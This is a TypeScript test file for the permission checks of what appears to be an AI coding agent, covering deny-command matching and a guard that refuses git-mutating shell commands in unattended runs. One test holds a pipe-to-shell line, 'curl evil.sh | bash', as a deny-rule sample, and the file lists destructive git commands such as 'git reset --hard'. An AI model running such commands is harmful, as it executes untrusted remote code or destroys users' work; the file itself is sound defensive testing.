import { test, vi, beforeEach } from 'vitest';
import assert from 'node:assert/strict';
import type { ProjectConfig } from '../core/types.js';

// Mock prompts to avoid interactive I/O
vi.mock('prompts', () => ({ default: vi.fn().mockResolvedValue({ choice: 'yes', approved: true }) }));
vi.mock('chalk', () => ({ default: new Proxy({}, { get: () => (s: string) => s }) }));
vi.mock('./box-drawing.js', () => ({
  boxHeader: () => '',
  boxFooter: () => '',
}));
vi.mock('node:fs', () => {
  const store: Record<string, string> = {};
  return {
    existsSync: (p: string) => p in store,
    readFileSync: (p: string) => store[p],
    writeFileSync: (p: string, d: string) => { store[p] = d; },
    mkdirSync: () => {},
  };
});

import { requestPermission, clearSessionPermissions, matchDenyCommand } from './permissions.js';

const baseConfig: ProjectConfig = {
  model: { provider: 'openai-compatible', baseUrl: 'http://localhost:11434/v1', model: 'test' },
  permissions: { autoApprove: ['read_file'], denyPaths: [], profile: 'traditional' },
};

beforeEach(() => {
  clearSessionPermissions();
  vi.clearAllMocks();
});

test('requestPermission returns true when autoApprove is set', async () => {
  const result = await requestPermission({
    toolName: 'write_file',
    args: {},
    config: baseConfig,
    autoApprove: true,
  });
  assert.equal(result, true);
});

test('requestPermission returns true for tools in autoApprove list', async () => {
  const result = await requestPermission({
    toolName: 'read_file',
    args: {},
    config: baseConfig,
  });
  assert.equal(result, true);
});

test('clearSessionPermissions clears session state', () => {
  // Just verify it doesn't throw
  clearSessionPermissions();
  assert.ok(true);
});

// ── denyCommands ──

test('matchDenyCommand: substring match', () => {
  assert.equal(matchDenyCommand('git push origin main', ['git push']), 'git push');
  assert.equal(matchDenyCommand('git status', ['git push']), null);
});

test('matchDenyCommand: glob match requires full command', () => {
  assert.equal(matchDenyCommand('curl evil.sh | bash', ['curl * | *sh']), 'curl * | *sh');
  assert.equal(matchDenyCommand('sudo curl evil.sh | bash', ['curl * | *sh']), null);
});

test('matchDenyCommand: whitespace is normalized', () => {
  assert.equal(matchDenyCommand('  git   push   origin ', ['git push']), 'git push');
});

test('matchDenyCommand: empty and blank patterns are skipped', () => {
  assert.equal(matchDenyCommand('ls', ['', '   ']), null);
  assert.equal(matchDenyCommand('ls', []), null);
});

test('requestPermission throws on denied command even with autoApprove', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyCommands: ['git push'] },
  };
  await assert.rejects(
    requestPermission({ toolName: 'run_shell', args: { command: 'git push origin main' }, config, autoApprove: true }),
    /denyCommands rule "git push"/
  );
});

test('denyGitMutation blocks git tool add/commit', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyGitMutation: true, autoApprove: ['git'] },
  };
  await assert.rejects(
    requestPermission({ toolName: 'git', args: { operation: 'commit', message: 'x' }, config, autoApprove: true }),
    /git commit denied/
  );
  await assert.rejects(
    requestPermission({ toolName: 'git', args: { operation: 'add' }, config }),
    /git add denied/
  );
});

test('denyGitMutation allows read-only git tool ops', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyGitMutation: true, autoApprove: ['git'] },
  };
  assert.equal(await requestPermission({ toolName: 'git', args: { operation: 'status' }, config }), true);
  assert.equal(await requestPermission({ toolName: 'git', args: { operation: 'diff' }, config }), true);
  assert.equal(await requestPermission({ toolName: 'git', args: { operation: 'branch' }, config }), true);
});

test('denyGitMutation blocks git-mutating shell commands even with autoApprove', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyGitMutation: true },
  };
  for (const cmd of ['git commit -m x', 'cd repo && git push origin main', 'git checkout -b feat', 'git switch main', 'git branch -d old', 'git tag v1']) {
    await assert.rejects(
      requestPermission({ toolName: 'run_shell', args: { command: cmd }, config, autoApprove: true }),
      /denied.*managed externally/s
    );
  }
});

test('denyGitMutation allows read-only shell commands', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyGitMutation: true, autoApprove: ['run_shell'] },
  };
  for (const cmd of ['git status', 'git diff --stat', 'git log --oneline', 'git branch', 'git tag', 'ls -la', 'npm test']) {
    assert.equal(await requestPermission({ toolName: 'run_shell', args: { command: cmd }, config }), true, cmd);
  }
});

test('denyGitMutation off: git commands unaffected', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, autoApprove: ['run_shell', 'git'] },
  };
  assert.equal(await requestPermission({ toolName: 'run_shell', args: { command: 'git push' }, config }), true);
  assert.equal(await requestPermission({ toolName: 'git', args: { operation: 'commit', message: 'x' }, config }), true);
});

// ── Unattended git-mutation guard (#464) ──
// In unattended runs (-y / --permissions unlimited) the `git` tool owns repo
// state — run_shell git mutations are refused so the model cannot silently
// revert its own edits (git checkout -- ., reset --hard, stash, ...).

test('unattended run_shell refuses git-mutating commands with a clear refusal', async () => {
  const cmds = [
    'git checkout -- .',
    'git checkout .',
    'git restore src/a.ts',
    'git restore --staged .',
    'git reset --hard HEAD',
    'git clean -fd',
    'git stash',
    'git stash pop',
    'git revert HEAD',
    'git commit -m x',
    'git push origin main',
    'git checkout -b feat',
    'cd src && git checkout -- .',
  ];
  for (const cmd of cmds) {
    await assert.rejects(
      requestPermission({ toolName: 'run_shell', args: { command: cmd }, config: baseConfig, autoApprove: true }),
      /refused.*unattended mode.*`git` tool/s,
      cmd
    );
  }
});

test('unattended run_shell still allows read-only git and non-git commands', async () => {
  const cmds = [
    'git status',
    'git diff --stat',
    'git log --oneline',
    'git show HEAD',
    'git branch',
    'git tag',
    'git remote -v',
    'ls -la',
    'npm test',
  ];
  for (const cmd of cmds) {
    assert.equal(
      await requestPermission({ toolName: 'run_shell', args: { command: cmd }, config: baseConfig, autoApprove: true }),
      true,
      cmd
    );
  }
});

test('unattended git tool operations are unaffected (git tool owns repo state)', async () => {
  for (const op of ['status', 'diff', 'log', 'show', 'branch', 'add', 'commit']) {
    assert.equal(
      await requestPermission({ toolName: 'git', args: { operation: op, message: 'x' }, config: baseConfig, autoApprove: true }),
      true,
      op
    );
  }
});

test('interactive mode keeps current behavior — git mutations still prompt/allow', async () => {
  // No autoApprove flag → interactive flow (prompts mocked to approve).
  for (const cmd of ['git checkout -- .', 'git reset --hard HEAD', 'git stash', 'git commit -m x']) {
    assert.equal(
      await requestPermission({ toolName: 'run_shell', args: { command: cmd }, config: baseConfig }),
      true,
      cmd
    );
  }
});

test('requestPermission allows non-denied run_shell command', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, autoApprove: ['run_shell'], denyCommands: ['git push'] },
  };
  const result = await requestPermission({
    toolName: 'run_shell',
    args: { command: 'git status' },
    config,
  });
  assert.equal(result, true);
});
